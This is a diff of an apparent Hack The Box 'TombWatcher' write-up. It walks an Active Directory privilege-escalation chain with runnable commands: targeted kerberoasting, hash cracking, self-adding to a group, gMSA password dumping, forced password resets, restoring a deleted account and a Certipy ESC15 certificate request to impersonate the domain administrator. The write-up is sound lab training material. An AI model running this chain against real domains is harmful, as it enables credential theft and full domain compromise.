@@ -36,10 +36,10 @@ bloodhound-python --domain tombwatcher.htb --domain-controller dc01.tombwatcher.
 ```
 
 
-Seems like there's a clear path to the DC , HEnry --> WrtiteSPN [Alfred] --> Alfred Member of INfrastructure Group can ReadGMSAPassword for Ansible_Dev$ [ Computer account ]. Then ForceChangePassword of SAM --> who got WriteOwner on JOhn , then we can fucking login to the DC! Lets pwn this bad-boy !!
+Seems like there's a clear path to the DC , HEnry --> WrtiteSPN [Alfred] --> Alfred can add_self to the INfrastructure Group --> ReadGMSAPassword for Ansible_Dev$ [ Computer account ]. Then ForceChangePassword of SAM --> who got WriteOwner on JOhn , then we can fucking login to the DC! Lets pwn this bad-boy !!
 
 
-![](tomb-blood.png)
+![](blood-tomB.png)
 
 
 ![](bloodhound-tomb.png)
@@ -58,8 +58,7 @@ A targeted kerberoast attack can be performed using PowerView's Set-DomainObject
 ```
 
 ```targetedKerberoast
-
-└─# python targetedKerberoast.py --domain tombwatcher.htb --user henry --password 'H3nry_987TGV!' --dc-ip 10.10.11.72
+python targetedKerberoast.py --domain tombwatcher.htb --user henry --password 'H3nry_987TGV!' --dc-ip 10.10.11.72
 ```
 
 
@@ -68,12 +67,25 @@ A targeted kerberoast attack can be performed using PowerView's Set-DomainObject
 We can crack the password using john- or other crackers ;
 
 ```john-the-ripper
-
 └─# john --wordlist=/usr/share/wordlists/rockyou.txt alfred_hash 
 
 basketball       (alfred) 
 ```
 
+
+
+### ADD_SELF 
+
+```add-self
+
+The user ALFRED@TOMBWATCHER.HTB has the ability to add itself, to the group INFRASTRUCTURE@TOMBWATCHER.HTB. Because of security group delegation, the members of a security group have the same privileges as that group.
+```
+
+
+```
+bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred
+[+] alfred added to INFRASTRUCTURE
+```
 
 ### [ReadGMSAPassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword) 
 
@@ -85,7 +97,7 @@ ANSIBLE_DEV$@TOMBWATCHER.HTB is a Group Managed Service Account. The group INFRA
 
 
 ```
-└─# python gMSADumper.py --username alfred --password basketball --domain tombwatcher.htb         
+python gMSADumper.py --username alfred --password basketball --domain tombwatcher.htb         
 
 ansible_dev$  ::  4f46405647993c7d4e1dc1c25dd6ecf4  
 ```
@@ -102,10 +114,9 @@ The user ANSIBLE_DEV$@TOMBWATCHER.HTB has the capability to change the user SAM@
 ```
 
 ```
-pth-net rpc password "SAM" -U "tombwatcher.htb"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"4f46405647993c7d4e1dc1c25dd6ecf4" -S "DC01.tombwatcher.htb"
-Enter new password for SAM:
+bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$'  -p ':4f46405647993c7d4e1dc1c25dd6ecf4' set password SAM 'p@ssw0rd'
 
-SAM :: p@ssw0rd
+[+] Password changed successfully!
 ```
 
 ### [WriteOwner](https://www.thehacker.recipes/ad/movement/dacl/grant-ownership)
@@ -148,8 +159,9 @@ bloodhound-python --domain tombwatcher.htb --domain-controller dc01.tombwatcher.
 ```
 
 
+![](next-blood.png)
 
-![](next-blood-tomb.png)
+
 
 #### Generic Descendent Object Takeover
 
@@ -162,5 +174,71 @@ Now, the "john" user will have full control of ADCS OU.
 ```
 
 
-Then change the password of cert_admin , as its member of the OU , Now we can exploit the ADCS......
+
+### Domain Privilege Escalation
+
+Domain Object Deletion
+
+```
+PS > Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
+```
+
+![](del-user-tomb.png)
+
+
+```REstore_Back
+Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
+
+bloodyAD --host 10.10.11.72 -u john -p p@ssw0rd -d tombwatcher.htb remove uac cert_admin -f ACCOUNTDISABLE
+```
+
+As we own the OU, WE got GenericALl on this cert_admin-too !!
+
+```
+bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'john'  -p 'p@ssw0rd' set password CERT_ADMIN 'p@ssw0rd'
+```
+
+
+### Vulnerable ADCS Templates .... to the root !
+
+
+```
+certipy-ad find -username cert_admin@tombwatcher.htb -password 'p@ssw0rd' -dc-ip 10.10.11.72 -enabled -stdout -vulnerable
+```
+
+
+### [ESC-15 ](https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)
+
+
+
+
+```
+certipy-ad req \
+    -u 'cert_admin@tombwatcher.htb' -p 'p@ssw0rd' \
+    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
+    -ca 'tombwatcher-CA-1' -template 'WebServer' \
+    -upn 'administrator@tombwatcher.htb'  \
+    -application-policies 'Client Authentication'
+```
+
+
+![](certipy-tomb.png)
+
+
+```
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
+
+change_password administrator p@ssw0rd
+```
+
+
+![](certipy_change-pass.png)
+
+
+```
+evil-winrm -i tombwatcher.htb -u administrator -p p@ssw0rd
+```
+
+
+BOOM !!
 
